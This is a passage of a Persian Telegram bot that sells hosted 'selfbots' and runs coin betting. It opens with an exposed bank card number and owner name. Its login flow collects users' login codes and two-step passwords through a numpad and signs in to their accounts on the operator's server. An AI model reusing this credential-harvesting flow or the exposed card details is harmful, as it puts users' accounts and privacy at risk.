                    "card_number": "6219861453153586",
                    "card_owner": "امیرحسین جواهری",
                    "bank_name": "بلوبانک"
                }
    
    bot = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)
    
    class JSONDatabase:
        def __init__(self, filename="database.json"):
            self.filename = filename
            self.data = self.load_data()
        
        def load_data(self):
            try:
                if os.path.exists(self.filename):
                    with open(self.filename, 'r', encoding='utf-8') as f:
                        return json.load(f)
                else:
                    initial_data = {
                        "users": {}, 
                        "processes": {}, 
                        "temp_data": {}, 
                        "credits": {}, 
                        "timers": {},
                        "verifications": {},
                        "payments": {},
                        "settings": {
                            "coin_rate": COIN_RATE,
                            "toman_per_coin": TOMAN_PER_COIN,
                            "admin_id": ADMIN_ID
                        }
                    }
                    self.save_data(initial_data)
                    return initial_data
            except Exception as e:
                return {
                    "users": {}, "processes": {}, "temp_data": {}, 
                    "credits": {}, "timers": {}, "verifications": {}, 
                    "payments": {}, "settings": {}
                }
        
        def save_data(self, data=None):
            try:
                if data: 
                    self.data = data
                with open(self.filename, 'w', encoding='utf-8') as f:
                    json.dump(self.data, f, indent=4, ensure_ascii=False)
                return True
            except Exception as e:
                return False
        
        def get(self, category, key, default=None):
            try:
                return self.data.get(category, {}).get(str(key), default)
            except:
                return default
        
        def set(self, category, key, value):
            try:
                if category not in self.data: 
                    self.data[category] = {}
                self.data[category][str(key)] = value
                return self.save_data()
            except Exception as e:
                return False
        
        def delete(self, category, key):
            try:
                if category in self.data and str(key) in self.data[category]:
                    del self.data[category][str(key)]
                    return self.save_data()
                return False
            except Exception as e:
                return False  
        def get_all(self, category):
            try:
                return self.data.get(category, {})
            except:
                return {}
        
        def get_pending_verifications(self):
            try:
                verifications = self.data.get("verifications", {})
                return {k: v for k, v in verifications.items() if v.get('status') == 'pending'}
            except:
                return {}
        
        def get_pending_payments(self):
            try:
                payments = self.data.get("payments", {})
                return {k: v for k, v in payments.items() if v.get('status') == 'pending'}
            except:
                return {}
        
        def get_verified_users(self):
            try:
                users = self.data.get("users", {})
                return {k: v for k, v in users.items() if v.get('verified')}
            except:
                return {}
        
        def get_rejected_users(self):
            try:
                users = self.data.get("users", {})
                return {k: v for k, v in users.items() if v.get('rejected')}
            except:
                return {}
    
    db = JSONDatabase()
    user_timers = {}
    
    class UserTimer:
        def __init__(self, user_id, callback):
            self.user_id, self.callback, self.timer, self.is_running = user_id, callback, None, False
        
        def start(self):
            if self.is_running: 
                self.stop()
            self.is_running = True
            self.timer = threading.Timer(3600, self._on_timer)
            self.timer.start()
            db.set("timers", self.user_id, {"start_time": time.time(), "is_running": True})
        
        def stop(self):
            if self.timer: 
                self.timer.cancel()
            self.is_running = False
            db.delete("timers", self.user_id)
        
        def _on_timer(self):
            self.is_running = False
            db.delete("timers", self.user_id)
            self.callback(self.user_id)
    async def betting_info_handler(client, message):
        info_text = """
    🎲 **سیستم شرطبندی گروهی 1v1**
    
    **📋 قوانین شرطبندی:**
    1️⃣ در گروه با نوشتن `شرطبندی 100` (یا هر مقدار دیگر) می‌توانید شرط ایجاد کنید
    2️⃣ نفر دوم می‌تواند با کلیک روی دکمه «پیوستن به شرط» وارد شود
    3️⃣ پس از پیوستن نفر دوم، ۵ ثانیه بعد برنده مشخص می‌شود
    4️⃣ برنده تمام مبلغ شرط را دریافت می‌کند
    5️⃣ اگر در ۵ دقیقه کسی شرکت نکند، شرط لغو و مبلغ بازگردانده می‌شود
    
    **💰 مثال:**
    - شما: `شرطبندی 500`
    - حریف: پیوستن به شرط
    - برنده: تمام 1000 سکه را می‌برد (500+500)
    
    """
    
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
        ])
        
        await message.edit_text(info_text, reply_markup=keyboard)
    def create_numpad_keyboard(prefix="code"):
        buttons = []
        
        row1 = [
            InlineKeyboardButton("1️⃣", callback_data=f"{prefix}_1"),
            InlineKeyboardButton("2️⃣", callback_data=f"{prefix}_2"),
            InlineKeyboardButton("3️⃣", callback_data=f"{prefix}_3")
        ]
        
        row2 = [
            InlineKeyboardButton("4️⃣", callback_data=f"{prefix}_4"),
            InlineKeyboardButton("5️⃣", callback_data=f"{prefix}_5"),
            InlineKeyboardButton("6️⃣", callback_data=f"{prefix}_6")
        ]
        
        row3 = [
            InlineKeyboardButton("7️⃣", callback_data=f"{prefix}_7"),
            InlineKeyboardButton("8️⃣", callback_data=f"{prefix}_8"),
            InlineKeyboardButton("9️⃣", callback_data=f"{prefix}_9")
        ]
        
        row4 = [
            InlineKeyboardButton("⌨️ پاک کن", callback_data=f"{prefix}_clear"),
            InlineKeyboardButton("0️⃣", callback_data=f"{prefix}_0"),
            InlineKeyboardButton("✅ ارسال", callback_data=f"{prefix}_send")
        ]
        
        row5 = [
            InlineKeyboardButton("🔙 انصراف", callback_data=f"{prefix}_cancel")
        ]
        
        buttons.append(row1)
        buttons.append(row2)
        buttons.append(row3)
        buttons.append(row4)
        buttons.append(row5)
        
        return InlineKeyboardMarkup(buttons)
    
    def format_code_display(code):
        if not code:
            return "⚪.⚪.⚪.⚪.⚪"
        
        digits = list(code)
        while len(digits) < 5:
            digits.append("⚪")
        
        return ".".join(digits)
    async def handle_code_from_keyboard(client, code_message):
        user_id = code_message.from_user.id
        code = code_message.text 
    
        code = code.replace(".", "")
        
        temp_data = db.get("temp_data", user_id)
        
        if not temp_data:
            await client.send_message(user_id, "❌ اطلاعات یافت نشد\nلطفا دوباره شماره تلفن را ارسال کنید")
            return
        
        try:
            if user_id in active_clients:
                user_client = active_clients[user_id]
            else:
                session_name = f"sessions/{user_id}"
                user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
                await user_client.connect()
                active_clients[user_id] = user_client
            
            try: 
                await user_client.sign_in(temp_data["phone"], temp_data["phone_code_hash"], code)
            except SessionPasswordNeeded:
                await client.send_message(
                    user_id,
                    "🔒 **رمز دو مرحله‌ای نیاز است**\n\n"
                    "لطفا رمز دو مرحله‌ای خود را به صورت متن ارسال کنید:"
                )
                db.set("temp_data", user_id, {**temp_data, "needs_password": True})
                return
            
            user_info = {
                "phone": temp_data["phone"],
                "status": "active", 
                "created_at": time.time(),
                "last_active": time.time(),
                "verified": db.get("users", user_id, {}).get("verified", False)
            }
            db.set("users", user_id, user_info)
            db.delete("temp_data", user_id)
            
            if user_id in active_clients:
                try:
                    await active_clients[user_id].disconnect()
                    del active_clients[user_id]
                except:
                    pass
    
            if run_selfbot(user_id, temp_data["phone"]):
                credits = db.get("credits", user_id, 0)
                await client.send_message(
                    user_id,
                    f"✅ **سلف بات فعال شد!**\n\n"
                    f"💰 سکه های شما: {credits}\n"
                    f"⏰ زمان باقی‌مانده: {credits} ساعت"
                )
            else: 
                await client.send_message(user_id, "❌ خطا در اجرای سلف بات")
            
        except Exception as e: 
            error_msg = str(e)
            if "PHONE_CODE_EXPIRED" in error_msg:
                await client.send_message(
                    user_id,
                    "❌ **کد منقضی شده!**\n\n"
                    "لطفا دوباره شماره تلفن خود را ارسال کنید."
                )
                db.delete("temp_data", user_id)
                if user_id in active_clients:
                    try:
                        await active_clients[user_id].disconnect()
                        del active_clients[user_id]
                    except:
                        pass
            else:
                await client.send_message(user_id, f"❌ **خطا:** {error_msg}")
    
    async def cancel_group_bet_if_no_joiner(client, bet_key):
        await asyncio.sleep(300) 
    
        bet_data = db.get("group_bets", bet_key)
        if not bet_data or bet_data.get("finished"):
            return
    
        participants = bet_data.get("participants", [])
        chat_id = bet_data["chat_id"]
        message_id = bet_data["message_id"]
        amount = bet_data["amount"]
        creator_id = bet_data["creator_id"]
        creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
        creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
        
        if len(participants) > 0:
            return
        
        if bet_data.get("refunded"):
            return
        
        creator_credits = db.get("credits", creator_id, 0)
        db.set("credits", creator_id, creator_credits + amount)
    
        bet_data["finished"] = True
        bet_data["is_active"] = False
        bet_data["refunded"] = True
        db.set("group_bets", bet_key, bet_data)
    
        text = (
            "⛔ شرط به دلیل عدم شرکت‌کننده لغو شد.\n\n"
            f"👤 سازنده: {creator_mention}\n"
            f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
            "💸 مبلغ به سازنده برگشت داده شد."
        )
        
        try:
            await client.edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
        except:
            pass
    
        try:
            await client.send_message(
                creator_id,
                f"⛔ **شرط شما لغو شد!**\n\n"
                f"به دلیل عدم شرکت‌کننده، شرط شما لغو شد.\n"
                f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
                f"💸 مبلغ به حساب شما برگشت داده شد.\n\n"
                f"📊 موجودی جدید شما: <code>{db.get('credits', creator_id, 0)}</code> سکه"
            )
        except:
            pass
    
    async def finish_group_bet(client, bet_key):
        await asyncio.sleep(5)
    
        bet_data = db.get("group_bets", bet_key)
        if not bet_data or bet_data.get("finished"):
            return
    
        chat_id = bet_data["chat_id"]
        message_id = bet_data["message_id"]
        amount = bet_data["amount"]
        creator_id = bet_data["creator_id"]
        creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
        creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
        participants = bet_data.get("participants", [])
        
        if len(participants) == 0:
            if not bet_data.get("refunded"):
                creator_credits = db.get("credits", creator_id, 0)
                db.set("credits", creator_id, creator_credits + amount)
                bet_data["refunded"] = True
    
            bet_data["finished"] = True
            bet_data["is_active"] = False
            db.set("group_bets", bet_key, bet_data)
    
            text = (
                "⛔ شرط به حد نصاب نرسید و لغو شد.\n\n"
                f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
                f"👤 سازنده: {creator_mention}"
            )
            try:
                await client.edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
            except:
                pass
            return
        
        players = [{"id": creator_id, "name": bet_data.get('creator_name', 'کاربر')}] + participants
        player_ids = [creator_id] + [p["id"] for p in participants]
        player_mentions = [creator_mention]
        for p in participants:
            p_name = html.escape(p.get('name', 'کاربر'))
            player_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
        
        pot = (1 + len(participants)) * amount 
    
        import random
        winner_index = random.choice(range(len(players)))
        winner_id = player_ids[winner_index]
        winner_mention = player_mentions[winner_index]
        winner_credits = db.get("credits", winner_id, 0) + pot
        db.set("credits", winner_id, winner_credits)
    
        bet_data["finished"] = True
        bet_data["is_active"] = False
        bet_data["winner_id"] = winner_id
        bet_data["winner_name"] = players[winner_index].get("name", "کاربر")
        bet_data["pot"] = pot
        db.set("group_bets", bet_key, bet_data)
    
        players_text = "\n".join([f"• {mention}" for mention in player_mentions])
    
        result_text = (
            "🎉 **نتیجه شرط 1v1**\n\n"
            f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
            f"👥 تعداد بازیکنان: <code>{len(players)}</code> نفر\n"
            f"📋 فهرست بازیکنان:\n{players_text}\n\n"
            f"🏆 **برنده:** {winner_mention}\n"
            f"💎 **جایزه:** <b>{pot}</b> سکه"
        )
    
        try:
            await client.edit_message_text(chat_id, message_id, result_text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
        except:
            pass
    
        try:
            await client.send_message(
                chat_id,
                f"🏆 {winner_mention} برنده شرط <code>{amount}</code> سکه‌ای شد و <b>{pot}</b> سکه دریافت کرد!",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        try:
            await client.send_message(
                winner_id,
                f"🎉 **تبریک! شما برنده شرط شدید!**\n\n"
                f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
                f"💎 جایزه دریافتی: <b>{pot}</b> سکه\n"
                f"👥 تعداد بازیکنان: {len(players)} نفر\n\n"
                f"📊 موجودی جدید شما: <code>{db.get('credits', winner_id, 0)}</code> سکه"
            )
        except:
            pass
    
        for player in players:
            if player["id"] != winner_id:
                try:
                    await client.send_message(
                        player["id"],
                        f"😔 **متاسفانه شما در شرط باختید!**\n\n"
                        f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
                        f"👥 تعداد بازیکنان: {len(players)} نفر\n"
                        f"🏆 برنده: {winner_mention}\n\n"
                        f"📊 موجودی فعلی شما: <code>{db.get('credits', player['id'], 0)}</code> سکه"
                    )
                except:
                    pass
    async def check_force_join(client, user_id):
        not_joined = []
    
        for ch in FORCE_CHANNELS:
            try:
                member = await client.get_chat_member(ch, user_id)
                if member.status in ("kicked", "banned"):
                    not_joined.append(ch)
            except:
                not_joined.append(ch)
    
        if not_joined:
            return False, not_joined
        
        return True, []
    
    def deduct_credit_callback(user_id):
        try:
            if not db.get("processes", user_id): 
                return
            credits = db.get("credits", user_id, 0)
            if credits > 0:
                new_credits = credits - 1
                db.set("credits", user_id, new_credits)
                if new_credits <= 0:
                    stop_selfbot(user_id)
                    db.set("credits", user_id, 0) 
                    try: 
                        bot.send_message(
                            user_id, 
                            "❌ **سکه های شما تمام شد!**\n\n"
                            "سلف بات متوقف شد.\n\n"
                            "💰 برای ادامه استفاده، از طریق منوی «افزایش موجودی» حساب خود را شارژ کنید."
                        )
                    except: 
                        pass
                else:
                    if user_id in user_timers: 
                        user_timers[user_id].start()
            else:
                stop_selfbot(user_id)
                db.set("credits", user_id, 0)
                try: 
                    bot.send_message(
                        user_id, 
                        "❌ **سکه های شما تمام شد!**\n\n"
                        "سلف بات متوقف شد.\n\n"
                        "💰 برای ادامه استفاده، از طریق منوی «افزایش موجودی» حساب خود را شارژ کنید."
                    )
                except: 
                    pass
        except Exception as e:
            print(f"❌ خطا در deduct_credit_callback: {e}")
    
    def run_selfbot(user_id, phone=None):
        try:
            stop_selfbot(user_id)
    
            if phone:
                cmd = [sys.executable, "bot.py", str(user_id), phone, str(API_ID), API_HASH]
            else:
                cmd = [sys.executable, "bot.py", str(user_id)]
            
            process = subprocess.Popen(cmd)
            pid = process.pid
    
            db.set("processes", user_id, pid)
            
            with open(f"process_{user_id}.pid", "w") as f:
                f.write(str(pid))
            
            print(f"✅ سلف‌بات برای کاربر {user_id} راه‌اندازی شد")
            print(f"   📱 شماره: {phone}")
            print(f"   🆔 PID: {pid}")
            print(f"   💰 سکه: {db.get('credits', user_id, 0)}")
            print("-" * 50)
            
            if user_id not in user_timers:
                user_timers[user_id] = UserTimer(user_id, deduct_credit_callback)
            user_timers[user_id].start()
            
            return True
        except Exception as e:
            print(f"❌ خطا در اجرای سلف‌بات: {e}")
            return False
    
    def stop_selfbot(user_id):
        try:
            if user_id in user_timers:
                user_timers[user_id].stop()
                if not db.get("users", user_id): 
                    del user_timers[user_id]
            
            pid = db.get("processes", user_id)
            if pid:
                try:
                    import os
                    import signal
                    try:
                        os.kill(pid, signal.SIGTERM)
                        time.sleep(0.5)
                    except:
                        pass
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except:
                        pass
                    try:
                        import subprocess
                        subprocess.run(["pkill", "-f", f"bot.py {user_id}"], 
                                     capture_output=True, check=False)
                        subprocess.run(["pkill", "-f", "bot.py"], 
                                     capture_output=True, check=False)
                    except:
                        pass
                    
                except Exception as e:
                    print(f"⚠️ خطا در قطع پروسس: {e}")
                
                db.delete("processes", user_id)
                user_data = db.get("users", user_id, {})
                if user_data:
                    user_data["status"] = "inactive"
                    db.set("users", user_id, user_data)
                
                try:
                    os.remove(f"process_{user_id}.pid")
                except:
                    pass
                
                print(f"✅ سلف‌بات کاربر {user_id} قطع شد (PID: {pid})")
                return True
            
            try:
                import subprocess
                subprocess.run(["pkill", "-f", f"bot.py {user_id}"], check=False)
                subprocess.run(["pkill", "-f", "bot.py"], check=False)
                db.delete("processes", user_id)
                print(f"✅ سلف‌بات کاربر {user_id} قطع شد (از طریق pkill)")
                return True
            except:
                pass
                
            return False
        except Exception as e:
            print(f"❌ خطا در stop_selfbot: {e}")
            return False
    
    def stop_all_selfbots():
        try:
            for timer in list(user_timers.values()): 
                timer.stop()
            user_timers.clear()
            for pid in db.data.get("processes", {}).values():
                try: 
                    import psutil
                    psutil.Process(pid).terminate()
                except: 
                    pass
            db.data["processes"], db.data["timers"] = {}, {}
            db.save_data()
        except: 
            pass
    @bot.on_message(filters.group & filters.regex(r'^موجودی$'))
    async def group_balance_simple(client, message: Message):
        user_id = message.from_user.id
        ok, not_joined = await check_force_join(client, user_id)
        if not ok:
            buttons = []
            for ch in FORCE_CHANNELS:
                buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
            buttons.append([InlineKeyboardButton("🔁 بررسی مجدد", callback_data="check_join")])
            
            await message.reply_text(
                "⚠️ **برای مشاهده موجودی باید در کانال‌های زیر عضو باشید:**\n\n" +
                "\n".join([f"• @{channel}" for channel in FORCE_CHANNELS]),
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return
        credits = db.get("credits", user_id, 0)
        toman_value = int(credits * TOMAN_PER_COIN)
        user_first_name = html.escape(message.from_user.first_name or "کاربر")
        user_mention = f'<a href="tg://user?id={user_id}"><b>{user_first_name}</b></a>'
        balance_text = f"""
    💎 <b>موجودی {user_mention}</b> 💎
    
    <b>━━━━━━━━━━━━━━━━━━</b>
    
    💰 <b>موجودی سکه‌ها:</b>
    └─ <code>{credits:,}</code> سکه
    
    💵 <b>ارزش تومانی:</b>
    └─ <code>{toman_value:,}</code> تومان
    
    <b>━━━━━━━━━━━━━━━━━━</b>
    
    """
        
        await message.reply_text(
            balance_text,
            parse_mode=enums.ParseMode.HTML
        )
    @bot.on_message(filters.command("set") & filters.user(ADMIN_ID))
    async def set_credits(client, message: Message):
        if len(message.command) != 3:
            await message.reply_text("❌ فرمت: `/set آیدی تعداد`")
            return
        
        try:
            target_id = int(message.command[1])
            amount = int(message.command[2])
            db.set("credits", target_id, amount)
            
            await message.reply_text(f"✅ سکه کاربر {target_id} تنظیم شد به {amount}")
            
            try:
                await bot.send_message(target_id, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
            except: 
                pass
            
        except: 
            await message.reply_text("❌ آیدی/تعداد باید عدد باشد")
    @bot.on_message(filters.group & filters.regex(r'^شرطبندی\s+(\d+)(?:\s*سکه)?$'))
    async def group_bet_handler(client, message: Message):
        chat_id = message.chat.id
        creator_id = message.from_user.id
    
        try:
            amount = int(message.matches[0].group(1))
        except:
            return
    
        if amount <= 0:
            await message.reply_text("❌ مقدار شرط باید بیشتر از صفر باشد.")
            return
        creator_credits = db.get("credits", creator_id, 0)
        if creator_credits < amount:
            await message.reply_text(
                f"❌ سکه کافی برای ساخت شرط ندارید.\n"
                f"💰 موجودی شما: {creator_credits} سکه"
            )
            return
        db.set("credits", creator_id, creator_credits - amount)
        creator_first_name = html.escape(message.from_user.first_name or 'کاربر')
        creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
    
        bet_text = (
            "🎲 شرطبندی درحال اجرا ...\n\n"
            f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
            f"👤 سازنده: {creator_mention}\n\n"
            "برای شرکت در این شرط روی دکمه «پیوستن به شرط» بزنید.\n"
            "⛔ اگر تا ۵ دقیقه کسی شرکت نکند، شرط لغو و مبلغ به سازنده برمی‌گردد.\n"
            "⏳ پس از پیوستن نفر دوم، ۵ ثانیه بعد برنده مشخص می‌شود."
        )
    
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ پیوستن به شرط", callback_data=f"joinbet_waiting"),
                InlineKeyboardButton("⛔ لغو شرط", callback_data=f"cancelbet_waiting")
            ]
        ])
    
        bet_msg = await message.reply_text(bet_text, reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)
    
        bet_key = f"{chat_id}_{bet_msg.id}"
    
        bet_data = {
            "chat_id": chat_id,
            "message_id": bet_msg.id,
            "amount": amount,
            "creator_id": creator_id,
            "creator_name": message.from_user.first_name or "",
            "creator_username": message.from_user.username or "",
            "participants": [],
            "is_active": True,
            "finished": False,
            "timer_started": False,
            "created_at": time.time(),
            "refunded": False
        }
    
        db.set("group_bets", bet_key, bet_data)
        
        try:
            new_keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ پیوستن به شرط", callback_data=f"joinbet_{chat_id}_{bet_msg.id}"),
                    InlineKeyboardButton("⛔ لغو شرط", callback_data=f"cancelbet_{chat_id}_{bet_msg.id}")
                ]
            ])
            await bet_msg.edit_reply_markup(new_keyboard)
        except Exception as e:
            print(f"Error updating keyboard: {e}")
            
        asyncio.create_task(cancel_group_bet_if_no_joiner(client, bet_key))
    @bot.on_message(filters.command("user") & filters.user(ADMIN_ID))
    async def user_info(client, message: Message):
        if len(message.command) != 2:
            await message.reply_text("❌ فرمت: `/user آیدی`")
            return
        
        try:
            target_id = int(message.command[1])
            user_data = db.get("users", target_id, {})
            credits = db.get("credits", target_id, 0)
            process = db.get("processes", target_id)
            timer = db.get("timers", target_id)
            
            if not user_data:
                await message.reply_text("❌ کاربر یافت نشد")
                return
            
            status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
            phone = user_data.get('phone', '❌ ثبت نشده')
            created = time.ctime(user_data.get('created_at', time.time()))
            running = "🟢 بله" if process else "🔴 خیر"
            has_timer = "🟢 فعال" if timer and timer.get('is_running') else "🔴 غیرفعال"
            verified_status = "✅ تایید شده" if user_data.get('verified') else "❌ تایید نشده"
            rejected_status = "❌ رد شده" if user_data.get('rejected') else "✅ فعال"
            
            created_time = user_data.get('created_at', time.time())
            time_diff = time.time() - created_time
            days = int(time_diff // 86400)
            hours = int((time_diff % 86400) // 3600)
            
            info_text = f"""
    👤 **اطلاعات کاربر {target_id}**
    
    📱 **شماره:** `{phone}`
    📊 **وضعیت:** {status}
    🔐 **احراز هویت:** {verified_status}
    🚫 **وضعیت رد:** {rejected_status}
    💰 **سکه ها:** `{credits}`
    🔄 **سلف:** {running}
    📅 **تاریخ ایجاد:** `{created}`
    ⏳ **عضو شده:** {days} روز و {hours} ساعت
    
    ⏱ **زمان باقی‌مانده:** `{credits}` ساعت
    💸 **مصرف سکه:** 1 سکه در ساعت
    """
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎯 تنظیم سکه", callback_data=f"set_{target_id}"),
                 InlineKeyboardButton("🛑 توقف سلف", callback_data=f"stop_{target_id}")],
                [InlineKeyboardButton("✅ تایید احراز", callback_data=f"verify_approve_{target_id}"),
                 InlineKeyboardButton("❌ رد احراز", callback_data=f"verify_reject_{target_id}")]
            ])
            
            await message.reply_text(info_text, reply_markup=keyboard)
            
        except: 
            await message.reply_text("❌ آیدی باید عدد باشد")
    
    @bot.on_message(filters.command("admin") & filters.user(ADMIN_ID))
    async def admin_panel(client, message: Message):
        users = db.data.get("users", {})
        active_count = len(db.data.get("processes", {}))
        total_credits = sum(db.data.get("credits", {}).values())
        verified_users = len(db.get_verified_users())
        pending_verifications = len(db.get_pending_verifications())
        pending_payments = len(db.get_pending_payments())
        
        today = time.time() - 86400
        new_today = sum(1 for user_data in users.values() if user_data.get('created_at', 0) > today)
        
        stats_text = f"""
    🛠 **پنل مدیریت ادمین**
    
    👥 **کل کاربران:** `{len(users)}`
    🟢 **کاربران فعال:** `{active_count}`
    ✅ **کاربران تایید شده:** `{verified_users}`
    🆕 **کاربران امروز:** `{new_today}`
    💰 **مجموع سکه ها:** `{total_credits}`
    
    📋 **درخواست‌های در انتظار:**
    ├─ 🔐 احراز هویت: `{pending_verifications}`
    └─ 💰 پرداخت: `{pending_payments}`
    
    **📋 دستورات سریع:**
    `/set آیدی تعداد` - تنظیم سکه
    `/user آیدی` - اطلاعات کاربر
    `/admin` - این پنل
    """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list"),
             InlineKeyboardButton("📊 آمار کامل", callback_data="admin_stats")],
            [InlineKeyboardButton("💰 برترین کاربران", callback_data="admin_top"),
             InlineKeyboardButton("🛑 توقف همه", callback_data="admin_stop_all")],
            [InlineKeyboardButton("🔐 درخواست احراز", callback_data="admin_verifications"),
             InlineKeyboardButton("💳 درخواست پرداخت", callback_data="admin_payments")]
        ])
        
        await message.reply_text(stats_text, reply_markup=keyboard)
    
    @bot.on_callback_query(filters.regex(r'^code_'))
    async def numpad_callback(client, callback_query):
        user_id = callback_query.from_user.id
        data = callback_query.data
        current_code = user_temp_codes.get(user_id, "")
        
        if data == "code_clear":
            user_temp_codes[user_id] = current_code[:-1]
            display_code = user_temp_codes[user_id]
    
            formatted = format_code_display(display_code)
            
            try:
                await callback_query.message.edit_text(
                    f"🔢 **کد تایید را وارد کنید:**\n\n"
                    f"<b><code>{formatted}</code></b>\n\n"
                    f"📱 کد {len(display_code)}/5 رقم وارد شد",
                    reply_markup=create_numpad_keyboard(),
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                print(f"❌ خطا در ویرایش پیام: {e}")
            
            await callback_query.answer()
            
        elif data == "code_send":
            if len(current_code) == 5:
                await callback_query.answer("✅ کد ارسال شد...", show_alert=True)
                class FakeMessage:
                    def __init__(self, user_id, code):
                        self.from_user = type('obj', (object,), {'id': user_id})()
                        self.text = code
                        self.chat = type('obj', (object,), {'id': user_id})()
                        self.reply_text = None
                        
                    async def reply_text(self, text, *args, **kwargs):
                        await client.send_message(user_id, text, *args, **kwargs)
                
                fake_msg = FakeMessage(user_id, current_code)
    
                await handle_code_from_keyboard(client, fake_msg)
                
                user_temp_codes.pop(user_id, None)
            else:
                await callback_query.answer(f"❌ کد باید 5 رقم باشد (الان {len(current_code)} رقم)", show_alert=True)
                
        elif data == "code_cancel":
            user_temp_codes.pop(user_id, None)
            try:
                await callback_query.message.edit_text(
                    "❌ **ورود کد لغو شد**\n\n"
                    "برای شروع مجدد از /start استفاده کنید",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
                    ])
                )
            except Exception as e:
                print(f"❌ خطا در ویرایش پیام: {e}")
            
            await callback_query.answer()
            
        else:
            number = data.split("_")[1]
            
            if len(current_code) < 5:
                new_code = current_code + number
                user_temp_codes[user_id] = new_code
                formatted = format_code_display(new_code)
                
                try:
                    await callback_query.message.edit_text(
                        f"🔢 **کد تایید را وارد کنید:**\n\n"
                        f"<b><code>{formatted}</code></b>\n\n"
                        f"📱 کد {len(new_code)}/5 رقم وارد شد",
                        reply_markup=create_numpad_keyboard(),
                        parse_mode=enums.ParseMode.HTML
                    )
                except Exception as e:
                    print(f"❌ خطا در ویرایش پیام: {e}")
                
                await callback_query.answer()
            else:
                await callback_query.answer("❌ کد کامل شده است! روی 'ارسال' کلیک کنید", show_alert=True)
    
    async def admin_callback_handler(client, callback_query):
        data = callback_query.data
        user_id = callback_query.from_user.id
        
        # ====== لیست کاربران ======
        if data == "admin_list":
            users = db.get_all("users")
            if not users:
                await callback_query.message.edit_text("❌ هیچ کاربری ثبت نشده است.")
                return
            
            text = "👥 **لیست کاربران:**\n\n"
            for i, (uid, info) in enumerate(list(users.items())[:20], 1):
                credits = db.get("credits", int(uid), 0)
                status = "🟢" if info.get('status') == 'active' else "🔴"
                verified = "✅" if info.get('verified') else "❌"
                text += f"{i}. {status} {verified} `{uid}` → {credits} سکه\n"
            
            if len(users) > 20:
                text += f"\n... و {len(users) - 20} کاربر دیگر"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
            ])
            await callback_query.message.edit_text(text, reply_markup=keyboard)
            await callback_query.answer()
        
        # ====== آمار کامل ======
        elif data == "admin_stats":
            users = db.get_all("users")
            processes = db.get_all("processes")
            credits = db.get_all("credits")
            verifications = db.get_all("verifications")
            payments = db.get_all("payments")
            
            total_users = len(users)
            active_users = len(processes)
            total_credits = sum(credits.values()) if credits else 0
            pending_verif = sum(1 for v in verifications.values() if v.get('status') == 'pending')
            pending_pay = sum(1 for p in payments.values() if p.get('status') == 'pending')
            verified_users = sum(1 for u in users.values() if u.get('verified'))
            rejected_users = sum(1 for u in users.values() if u.get('rejected'))
            
            text = f"""
    📊 **آمار کامل سیستم**
    
    👥 **کاربران کل:** {total_users}
    🟢 **فعال:** {active_users}
    ✅ **تایید شده:** {verified_users}
    ❌ **رد شده:** {rejected_users}
    
    💰 **مجموع سکه‌ها:** {total_credits:,}
    
    🔐 **درخواست احراز:** {pending_verif}
    💳 **درخواست پرداخت:** {pending_pay}
    
    📅 **تاریخ:** {time.ctime()}
    """
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
            ])
            await callback_query.message.edit_text(text, reply_markup=keyboard)
            await callback_query.answer()
        
        # ====== برترین کاربران ======
        elif data == "admin_top":
            credits = db.get_all("credits")
            if not credits:
                await callback_query.message.edit_text("❌ هیچ کاربری سکه ندارد.")
                return
            
            sorted_users = sorted(credits.items(), key=lambda x: x[1], reverse=True)[:10]
            text = "🏆 **برترین کاربران از نظر سکه:**\n\n"
            for i, (uid, amount) in enumerate(sorted_users, 1):
                user_data = db.get("users", int(uid), {})
                name = user_data.get('first_name', 'ناشناس')
                text += f"{i}. {name} → `{amount:,}` سکه\n"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
            ])
            await callback_query.message.edit_text(text, reply_markup=keyboard)
            await callback_query.answer()
        
        # ====== توقف همه ======
        elif data == "admin_stop_all":
            await callback_query.message.edit_text("🛑 **در حال توقف همه سلف‌بات‌ها...**")
            stop_all_selfbots()
            await asyncio.sleep(1)
            await callback_query.message.edit_text("✅ **همه سلف‌بات‌ها متوقف شدند.**")
            await callback_query.answer()
        
        # ====== درخواست‌های احراز ======
